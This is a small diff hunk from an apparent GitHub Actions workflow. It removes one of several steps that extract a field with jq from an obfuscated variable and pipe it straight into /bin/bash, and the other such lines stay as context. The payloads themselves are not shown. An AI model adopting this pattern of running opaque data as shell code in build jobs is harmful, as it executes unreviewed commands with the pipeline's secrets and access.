@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$hm405" | jq -r .x8 | /bin/bash
           echo $j3 | jq -r .jcvhn28 | /bin/bash
           printf '%s' "$juv20904" | jq -r .r99 | /bin/bash
-          echo $khcd9509 | jq -r .t86 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
